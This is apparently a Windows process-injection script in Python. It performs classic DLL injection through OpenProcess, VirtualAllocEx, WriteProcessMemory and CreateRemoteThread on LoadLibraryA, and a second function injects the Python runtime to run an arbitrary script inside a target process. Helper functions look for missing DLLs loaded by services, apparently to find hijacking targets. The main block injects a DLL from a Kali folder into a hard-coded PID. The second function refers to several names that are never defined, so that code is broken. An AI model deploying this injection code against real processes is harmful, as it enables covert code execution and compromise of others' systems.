import argparse

import psutil, os.path
from psutil import AccessDenied
import sys
from ctypes import *
import argparse
import ctypes
import ctypes.util
import os
sys.path.insert(1, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))


INJECTION_STUB_TEMPLATE = r"""
import codecs
import runpy
import sys
import traceback

pipe = open(r'\\.\\pipe\{pipe_name}', 'w+b', 0)
sys.argv = ['']
sys.stderr = sys.stdout = codecs.getwriter('utf-8')(pipe)
try:
    runpy.run_path('{path}', run_name='__mayhem__')
except:
    traceback.print_exc()
pipe.close()
"""

kernel32 = ctypes.windll.kernel32
PIPE_NAME = 'mayhem'


def inject_dll(pid, dll_path):

    PAGE_READWRITE = 0x04
    PROCESS_ALL_ACCESS = (0x00F0000 | 0x00100000 | 0xFFF)
    VIRTUAL_MEM = (0x1000 | 0x2000)

    kernel32 = windll.kernel32
    dll_len = len(dll_path)

    # Get handle to process being injected...
    h_process = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, int(pid))

    if not h_process:
        print("[!] Couldn't get handle to PID: %s" % (pid))
        print("[!] Are you sure %s is a valid PID?" % (pid))
        sys.exit(0)

    # Allocate space for DLL path
    arg_address = kernel32.VirtualAllocEx(h_process, 0, dll_len, VIRTUAL_MEM, PAGE_READWRITE)

    # Write DLL path to allocated space
    written = c_int(0)
    kernel32.WriteProcessMemory(h_process, arg_address, dll_path, dll_len, byref(written))

    # Resolve LoadLibraryA Address
    h_kernel32 = kernel32.GetModuleHandleA("kernel32.dll")
    h_loadlib = kernel32.GetProcAddress(h_kernel32, "LoadLibraryA")

    # Now we createRemoteThread with entrypoiny set to LoadLibraryA and pointer to DLL path as param
    thread_id = c_ulong(0)

    if not kernel32.CreateRemoteThread(h_process, None, 0, h_loadlib, arg_address, 0, byref(thread_id)):
        print("[!] Failed to inject DLL, exit...")
        sys.exit(0)

    print("[+] Remote Thread with ID 0x%08x created." % (thread_id.value))


def inject_dll2(pid, dll_path):
    parser = argparse.ArgumentParser(description='python_injector: inject python code into a process',
                                     conflict_handler='resolve')
    parser.add_argument('script_path', action='store', help='python script to inject into the process')
    parser.add_argument('pid', action='store', type=int, help='process to inject into')
    parser.epilog = 'the __name__ variable will be set to __mayhem__'
    arguments = parser.parse_args()

    if not sys.platform.startswith('win'):
        print('[-] This tool is only available on Windows')
        return

    # get a handle the the process
    try:
        process_h = WindowsProcess(pid=arguments.pid)
    except ProcessError as error:
        print("[-] {0}".format(error.msg))
        return
    print("[+] Opened a handle to pid: {0}".format(arguments.pid))

    # find and inject the python library
    python_lib = "python{0}{1}.dll".format(sys.version_info.major, sys.version_info.minor)
    python_lib = ctypes.util.find_library(python_lib)
    if python_lib:
        print("[*] Found Python library at: {0}".format(python_lib))
    else:
        print('[-] Failed to find the Python library')
        return

    print('[*] Injecting Python into the process...')
    try:
        python_lib_h = process_h.load_library(python_lib)
    except ProcessError as error:
        print("[-] {0}".format(error.msg))
        return
    else:
        print("[+] Loaded {0} with handle 0x{1:08x}".format(python_lib, python_lib_h))

    # resolve the necessary functions
    local_handle = kernel32.GetModuleHandleW(python_lib)
    py_initialize_ex = python_lib_h + (kernel32.GetProcAddress(local_handle, b'Py_InitializeEx\x00') - local_handle)
    py_run_simple_string = python_lib_h + (
    kernel32.GetProcAddress(local_handle, b'PyRun_SimpleString\x00') - local_handle)
    print('[*] Resolved addresses:')
    print("  - Py_InitializeEx:    0x{0:08x}".format(py_initialize_ex))
    print("  - PyRun_SimpleString: 0x{0:08x}".format(py_run_simple_string))

    # call remote functions to initialize and run via remote threads
    thread_h = process_h.start_thread(py_initialize_ex, 0)
    process_h.join_thread(thread_h)

    print("[*] Waiting for client to connect on \\\\.\\pipe\\{0}".format(PIPE_NAME))
    injection_stub = INJECTION_STUB_TEMPLATE
    injection_stub = injection_stub.format(path=_escape(os.path.abspath(arguments.script_path)), pipe_name=PIPE_NAME)
    injection_stub = injection_stub.encode('utf-8') + b'\x00'

    shellcode_addr = process_h.allocate(size=utilities.align_up(len(injection_stub)), permissions='PAGE_READWRITE')
    process_h.write_memory(shellcode_addr, injection_stub)
    thread_h = process_h.start_thread(py_run_simple_string, shellcode_addr)
    client = NamedPipeClient.from_named_pipe(PIPE_NAME)
    while True:
        message = client.read()
        if message is None:
            break
        sys.stdout.write(message.decode('utf-8'))
    client.close()
    process_h.join_thread(thread_h)
    process_h.close()

def get_all_dlls_by_process_pid(pid):
    try:
        if not psutil.pid_exists(pid):
            print('There is no process running with PID: ' + str(pid))
            # return;

        p = psutil.Process(pid)
        dll_list = []
        for dll in p.memory_maps():
            if(dll.path[-3:] == "dll"):
                # print("Service name: " + p.name() + "- path: " + dll.path)
                dll_list.append(dll.path)

        for dll in dll_list:
            if not os.path.isfile(dll):
                print(dll + 'doesnt exists!! - PID: ' + str(pid))
    except AccessDenied:
        pass
        # print("Access denied for this process.")


def get_all_dlls_by_service_name(service_name):
    services = list(psutil.win_service_iter())
    for service in services:
        service = service.as_dict()
        if service['status'] != 'started' and service['pid'] is not None:
            get_all_dlls_by_process_pid(service['pid'])


if __name__ == "__main__":
    # for pid in psutil.pids():
    # get_all_dlls_by_process_pid(3196)
    inject_dll(12952, 'F:\VM\Kali\Shared\WININET.dll')